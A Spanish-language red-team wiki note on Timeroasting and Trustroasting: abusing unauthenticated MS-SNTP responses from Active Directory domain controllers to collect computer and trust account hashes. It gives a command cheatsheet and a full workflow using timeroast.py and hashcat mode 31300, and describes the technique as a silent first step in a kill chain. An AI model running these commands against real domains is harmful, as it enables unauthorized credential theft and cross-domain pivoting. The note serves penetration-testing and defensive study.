---
aliases:
  - Timeroasting
  - Trustroasting
  - NTP Roasting
tags:
  - technique/credential-access
  - asset/active-directory
  - env/windows
  - cred/ntlm
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[Kerberoasting]]"
  - "[[AS-REP Roasting]]"
  - "[[AD - Domain & Forest Trusts]]"
---
# Timeroasting

Técnica (Tom Tervoort / SecuraBV, 2024) que abusa de **MS-SNTP** — la extensión de autenticación de NTP en AD. El DC firma la respuesta NTP con un MAC = `MD5(NTLM_hash_de_la_computer_account || respuesta)`. El servidor **no valida quién pregunta**, así que se puede pedir la firma para el RID de **cualquier computer account sin credenciales** → hash crackeable offline.

A diferencia de Kerberoasting (necesita un usuario de dominio y apunta a SPN de *usuarios*), Timeroasting es **pre-auth** y apunta a **computer accounts** y **trust accounts**.

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `python3 timeroast.py $DC` | Hashes (`$sntp-ms$`) de todas las computer accounts, sin auth | Recon inicial sin credenciales. |
| `python3 timeroast.py $DC -o hashes.txt` | Guardar para crackear | Pipeline offline. |
| `python3 timeroast.py $DC -r 1000-1200` | Roast de un rango de RIDs específico | Targeting. |
| `python3 timeroast.py $DC -a` (old/legacy MAC) | Modo compatibilidad con DCs viejos | Si el default falla. |
| `hashcat -m 31300 hashes.txt rockyou.txt` | Crack del hash NTLM de la computer account | Solo pega en cuentas con password débil/manual. |
| **Trustroasting**: `timeroast.py $DC` filtrando RIDs de trust accounts (`$DOMAIN$`) | Hash de la cuenta de trust inter-dominio | Trusts con password débil → pivot cross-domain ([[AD - Domain & Forest Trusts]]). |

```bash
# Workflow completo (sin credenciales en la red)
git clone https://github.com/SecuraBV/Timeroast && cd Timeroast
python3 timeroast.py 10.10.10.10 -o roast.txt
hashcat -m 31300 roast.txt /usr/share/wordlists/rockyou.txt -O
# Hash crackeado = password de la computer account → auth como esa máquina
```

---

## Overview

**Por qué funciona:** MS-SNTP permite a clientes sin reloj confiable autenticar la hora contra el DC. La respuesta lleva un MAC derivado del hash NTLM de la cuenta cliente, pero el DC responde a cualquiera que pregunte por un RID — no hay control de acceso. Es esencialmente un oráculo de hashes de computer accounts.

**Limitación clave:** las computer accounts tienen passwords **aleatorios de 120 caracteres** rotados cada 30 días → normalmente **no crackeables**. Timeroasting pega cuando:
- La máquina fue unida al dominio con password **manual/débil** (común en appliances, IoT, equipos legacy).
- **Trust accounts** con password débil (Trustroasting) → escalar cross-domain.
- Aún sin crackear: **enumeración** de todas las computer accounts y sus RIDs sin credenciales.

**Ventaja sobre otras técnicas:** es **pre-autenticación** (no necesitás ni un usuario de dominio) y usa UDP/123 (NTP), un puerto raramente monitoreado para esto.

> [!tip] Posición en la kill chain
> Timeroasting va en la fase 0 (acceso a red sin creds), junto a [[AS-REP Roasting]] y poisoning. Bajo ratio de éxito pero costo cero y silencioso — vale tirarlo siempre al principio.

---

## Recursos

- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) — herramienta + whitepaper original.
- [Whitepaper "Timeroasting" (Tom Tervoort)](https://www.secura.com/blog/timeroasting-trustroasting-and-computer-spraying) — detalle del MS-SNTP abuse.
- Hashcat mode `31300` (`$sntp-ms$`).
